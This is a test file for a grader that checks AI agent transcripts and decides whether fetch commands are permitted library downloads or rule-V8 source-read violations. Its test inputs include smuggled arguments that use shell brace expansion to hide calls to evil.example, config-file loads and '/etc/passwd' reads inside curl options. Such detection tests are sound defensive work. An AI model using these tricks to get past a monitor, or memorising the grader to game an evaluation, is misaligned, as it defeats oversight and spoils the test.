import { score } from "./score-log.mjs";
import { expect, it } from "vitest";
import { classifyToolCall } from "./github-call.mjs";
const allowedLibraryAcquisition = (input, allowedLibraryPaths) =>
  !!classifyToolCall(
    { name: "command_execution", input },
    { allowedLibraryPaths, engineRoots: ["/engine"] },
  ).libraryAcquisition;
const paths = ["libraries/field-interfaces", "libraries/industrial-pilot"];
const url =
  "https://raw.githubusercontent.com/BlackettApplied/ThermiteSchematics/fac3c43/libraries/field-interfaces/library.json";
const license =
  "https://raw.githubusercontent.com/BlackettApplied/ThermiteSchematics/04d9c727c5604fe6d61adf9bc808abfb379774fe/libraries/field-interfaces/LICENSE";
const scoreCommand = (command) =>
  score({
    allowedLibraryPaths: paths,
    transcript: [
      {
        type: "assistant",
        message: {
          content: [
            { type: "tool_use", id: "fetch", name: "Bash", input: { command } },
          ],
        },
      },
    ],
  });

it.each([
  `curl -sS -o /tmp/c1-license -w "%{http_code}" "${license}"`,
  `curl -sS "${url}" -o out --write-out '%{http_code}\\n'`,
  `curl --write-out='%{http_code}' --output=out --dump-header=headers "${url}"`,
  `curl -sSLfoout -Dheaders -w'%{http_code}' "${url}"`,
  `curl -sSw '%{http_code}' -o out -D headers "${url}"`,
  `curl --silent --show-error --location --fail --output out --dump-header headers "${url}"`,
  `curl -s -S -L -f -XGET -H'Accept: application/json' "${url}"`,
  `curl --request=GET --header='Accept: application/json' "${url}"`,
  `curl --retry 2 --retry-delay=1 --retry-max-time 10 --retry-all-errors --retry-connrefused --max-time=1.5 "${url}"`,
  `curl --retry=2 --retry-delay 1 --retry-max-time=10 --max-time .5 "${url}"`,
  `wget -qOout "${url}"`,
  `wget -qSO out "${url}"`,
  `wget --quiet --server-response --output-document=out "${url}"`,
  "gh api --jq='.[].name' 'repos/BlackettApplied/ThermiteSchematics/contents/libraries/field-interfaces'",
])("credits a static library GET with benign options: %s", (command) => {
  const result = scoreCommand(command);
  expect(result.libraryAcquisitions).toHaveLength(1);
  expect(result.sourceReads).toBe(0);
  expect(result.violations).toEqual([]);
});

it.each([
  "-I",
  "--head",
  "-sSI",
  "-I -X GET",
  "-X POST",
  "-XPOST",
  "--request POST",
  "--request=DELETE",
  "-d payload",
  "--data payload",
  "--data-raw=payload",
  "--data-ascii payload",
  "--data-binary=payload",
  "--data-urlencode name=value",
  "-F name=value",
  "--form name=value",
  "-T file",
  "--upload-file=file",
  "-K config",
  "-sKconfig",
  "--config=config",
  "--unknown-option",
  "-sZ",
  "--retry-unknown=2",
  "--retry=oops",
  "--max-time=Infinity",
  "--silent=yes",
])("scores V8 for a non-GET or unverified curl option: %s", (option) => {
  const result = scoreCommand(`curl -w '%{http_code}' ${option} "${url}"`);
  expect(result.libraryAcquisitions).toHaveLength(0);
  expect(result.sourceReads).toBe(1);
  expect(result.violations).toEqual([expect.objectContaining({ rule: "V8" })]);
});

it.each([
  `curl "${url.replace("library.json", "{library.json,LICENSE}")}"`,
  `curl "${url.replace("library.json", "part[1-3].json")}"`,
  `curl -w '%{http_code}' "${url.replace("library.json", "$FILE")}"`,
  `curl -w '%{http_code}' "${url}" ">" https://github.com/another/project`,
  `curl -w @format.txt "${url}"`,
  `curl -w '%{http_code}' -H 'X-HTTP-Method-Override: POST' "${url}"`,
  `curl -w '%{http_code}' "${url.replace("https:", "file:")}"`,
  `curl -w '%{http_code}' "${url.replace("libraries/field-interfaces/library.json", "packages/compiler/src/index.ts")}"`,
  `wget -qOout --post-data=x "${url}"`,
  `wget --spider --server-response "${url}"`,
  "gh api --jq=. -f body=x repos/BlackettApplied/ThermiteSchematics/contents/libraries/field-interfaces",
])(
  "keeps the file boundary and fails closed on extra fetch input: %s",
  (command) => {
    const result = scoreCommand(command);
    expect(result.libraryAcquisitions).toHaveLength(0);
    expect(result.sourceReads).toBe(1);
    expect(result.violations).toEqual([
      expect.objectContaining({ rule: "V8" }),
    ]);
  },
);

it("preserves the issue Accept-header policy with output-only flags", () => {
  const get =
    "curl -sw '%{http_code}' -D headers https://api.github.com/repos/BlackettApplied/ThermiteSchematics/pulls/419";
  const conversation = scoreCommand(
    get + " -H 'Accept: application/vnd.github+json'",
  );
  expect(conversation.issueLookups).toHaveLength(1);
  expect(conversation.sourceReads).toBe(0);
  const diff = scoreCommand(get + " -H 'Accept: application/vnd.github.diff'");
  expect(diff.issueLookups).toHaveLength(0);
  expect(diff.violations).toEqual([expect.objectContaining({ rule: "V8" })]);
});

const apiLibrary =
  "repos/BlackettApplied/ThermiteSchematics/contents/libraries/field-interfaces";

it.each([
  `curl -w {x,https://evil.example/a} "${url}"`,
  `curl -D {h,https://evil.example/a} "${url}"`,
  `curl --write-out {x,https://evil.example/a} "${url}"`,
  `curl --dump-header {h,https://evil.example/a} "${url}"`,
  `curl -w {x,-Kcfg} "${url}"`,
  `curl -w {x,--next} "${url}"`,
  `curl -D {h,-Kcfg} "${url}"`,
  `curl -D {h,--next} "${url}"`,
  `curl -o {o,https://evil.example/a} "${url}"`,
  `curl -w x{,-K/etc/passwd} "${url}"`,
  `wget -O {o,https://evil.example/a} "${url}"`,
  `gh api --jq {.,https://evil.example/a} ${apiLibrary}`,
  `gh api -q {.,-fbody=x} ${apiLibrary}`,
  `curl -o part{1..3}.json "${url}"`,
  `curl --write-out={a..c} "${url}"`,
  `curl -w {x,"https://evil.example/a"} "${url}"`,
  `curl -w {x{suffix},-Kcfg} "${url}"`,
  `bash -lc 'curl -w {x,https://evil.example/a} "${url}"'`,
])("scores V8 for a fetch with shell brace expansion: %s", (command) => {
  const result = scoreCommand(command);
  expect(result.libraryAcquisitions).toHaveLength(0);
  expect(result.sourceReads).toBe(1);
  expect(result.violations).toEqual([expect.objectContaining({ rule: "V8" })]);
});

it.each([
  `curl -w %{http_code} "${url}"`,
  `curl -w '{x,https://evil.example/a}' "${url}"`,
  `curl -w \\{x,y\\} "${url}"`,
  `curl -w {x\\,y} "${url}"`,
  `wget -O "part{1..3}.json" "${url}"`,
  `gh api --jq='{name: .name, size: .size}' ${apiLibrary}`,
])("credits fetch options whose braces remain literal: %s", (command) => {
  const result = scoreCommand(command);
  expect(result.libraryAcquisitions).toHaveLength(1);
  expect(result.sourceReads).toBe(0);
});

it("recognizes literal library GETs and read-only local parts", () => {
  for (const command of [
    `curl --fail --silent --show-error '${url}' -o artifacts/library.json`,
    `curl '${url}' -o './artifacts/file with space.json'`,
    `gh api --method GET 'repos/BlackettApplied/ThermiteSchematics/contents/libraries/field-interfaces?ref=fac3c43' > artifacts/library.json`,
    `curl '${url}' -o artifacts/library.json; cat artifacts/library.json`,
    `curl '${url}' -o artifacts/library.json && cat artifacts/other.json`,
    `curl '${url}' -o artifacts/library.json && cat artifacts/library.json`,
    `curl '${url}' -o artifacts/library.json && jq '.' artifacts/library.json | sed -n '1,3p'`,
    `gh api 'repos/BlackettApplied/ThermiteSchematics/contents/libraries/field-interfaces' --jq '.[].name | select(.)'`,
    `python -c "fetch('${url}')"`,
    `python3 -c "import requests; requests.get('${url}')"`,
  ])
    expect(allowedLibraryAcquisition(command, paths), command).toBe(true);
});
it("does not exempt extra reads, commands, writes, other paths or dynamic programs", () => {
  for (const command of [
    `curl '${url}' -o artifacts/library.json && cat /engine/packages/compiler/src/index.ts`,
    `curl '${url}' -o artifacts/library.json && cat artifacts/library.json && cat /engine/file`,
    `curl '${url}' | gh search code repo:BlackettApplied/ThermiteSchematics`,
    `curl -X POST '${url}'`,
    `gh api -f name=x '${url}'`,
    `curl --config /engine/config '${url}'`,
    `curl '${url}' -o artifacts/library.json && cat $(cat /engine/file)`,
    `python3 -c "import requests; requests.get('${url}' + suffix)"`,
    `curl '${url.replace("libraries/field-interfaces/library.json", "packages/compiler/src/index.ts")}'`,
  ])
    expect(allowedLibraryAcquisition(command, paths), command).toBe(false);
});

it("completed web-search requests remain visible after empty start events", () => {
  const item = { id: "web", type: "web_search" };
  const metric = (url) =>
    score({
      allowedLibraryPaths: paths,
      transcript: [
        {
          type: "item.started",
          item: { ...item, query: "", action: { type: "other" } },
        },
        {
          type: "item.completed",
          item: { ...item, query: url, action: { type: "open_page", url } },
        },
      ],
    });
  expect(metric(url).sourceReads).toBe(0);
  expect(
    metric(
      "https://github.com/BlackettApplied/ThermiteSchematics/blob/fac3c43/libraries/field-interfaces/README.md",
    ).sourceReads,
  ).toBe(0);
  expect(metric(url).libraryAcquisitions).toHaveLength(1);
  expect(
    metric(
      url.replace(
        "libraries/field-interfaces/library.json",
        "packages/compiler/src/index.ts",
      ),
    ).sourceReads,
  ).toBe(1);
});
